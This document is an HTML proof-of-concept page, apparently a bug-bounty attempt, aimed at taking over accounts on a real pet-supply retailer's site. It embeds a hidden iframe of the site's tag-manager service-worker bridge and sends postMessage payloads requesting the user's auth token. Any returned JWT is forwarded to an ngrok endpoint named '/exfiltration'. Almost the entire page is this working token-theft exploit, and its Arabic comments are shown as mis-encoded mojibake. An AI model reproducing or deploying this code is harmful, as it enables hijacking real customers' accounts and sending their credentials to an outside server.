<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>PoC Account Takeover - Zooplus</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: monospace; padding: 30px; }
        .console { border: 1px solid #00ff00; padding: 15px; background: #000; min-height: 300px; box-shadow: 0 0 15px #00ff00; }
        .critical { color: #ff0000; font-weight: bold; text-decoration: underline; }
        iframe { display: none; } /* Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¬Ø³Ø± ØªÙ…Ø§Ù…Ø§Ù‹ */
    </style>
</head>
<body>
    <h2>Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§ØªØµØ§Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…...</h2>
    <div class="console" id="log"></div>

    <iframe id="sw_bridge" 
            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1"
            name="google_tag_manager_static_20"></iframe>

    <script>
        const logger = document.getElementById('log');
        const NGROK = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltration";

        function print(msg, isCritical = false) {
            const p = document.createElement('p');
            if (isCritical) p.className = 'critical';
            p.innerHTML = `> ${msg}`;
            logger.appendChild(p);
        }

        // 1. Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø±Ø¨Ø© Ù…Ù† Ø§Ù„Ø¬Ø³Ø±
        window.addEventListener("message", (event) => {
            if (event.origin.includes("zooplus.com")) {
                const data = event.data;
                print("Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ù…Ø³ØªÙ„Ù…Ø© Ù…Ù† Ø§Ù„Ù†Ø·Ø§Ù‚ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù...");

                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ø±Ø¯
                const dataStr = JSON.stringify(data);
                if (dataStr.includes("eyJ")) {
                    print("ğŸ”¥ ØªÙ… Ø§Ø¹ØªØ±Ø§Ø¶ JWT ACCESS TOKEN Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ!", true);
                    
                    // ØªÙ‡Ø±ÙŠØ¨ Ø§Ù„ØªÙˆÙƒÙ† Ù„Ø³ÙŠØ±ÙØ±Ùƒ
                    fetch(NGROK, {
                        method: "POST",
                        mode: "no-cors",
                        body: dataStr
                    });
                }
            }
        });

        // 2. ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¬Ø³Ø± ÙˆØ¥Ø±Ø³Ø§Ù„ Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬
        const bridge = document.getElementById('sw_bridge');
        bridge.onload = () => {
            print("Ø§Ù„Ø¬Ø³Ø± Ø§Ù„Ø£Ù…Ù†ÙŠ Ø¬Ø§Ù‡Ø². Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬...");

            const win = bridge.contentWindow;

            // Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø£ÙˆÙ„: Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø© Ù„Ø±Ø¨Ø·Ù‡ Ø¨Ø§Ù„ØªÙˆÙƒÙ†
            win.postMessage({ type: 0, clientId: 'attack-v1', data: 'status_check' }, "*");

            // Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø«Ø§Ù†ÙŠ: Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø­Ø¨ Ø§Ù„ØªÙˆÙƒÙ† Ø¹Ø¨Ø± Ø§Ø³ØªØºÙ„Ø§Ù„ Ø«ØºØ±Ø© Ø§Ù„Ù€ Variable Reflection
            // Ù†Ø­Ù† Ù†Ø±Ø³Ù„ Ø£ÙˆØ§Ù…Ø± ÙŠØ­Ø§ÙˆÙ„ Ø§Ù„Ù€ Service Worker Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡Ø§
            const payloads = [
                { type: 0, clientId: 'attack-v1', data: 'frontendAuthorizer.token' },
                { type: 'GET_DATA', key: 'token' },
                { type: 'IDENTITY', action: 'dump' }
            ];

            payloads.forEach((p, i) => {
                setTimeout(() => {
                    print(`Ø¥Ø±Ø³Ø§Ù„ Ù†Ø¨Ø¶Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ #${i+1}...`);
                    win.postMessage(p, "*");
                }, 1000 * (i + 1));
            });
        };
    </script>
</body>
</html>
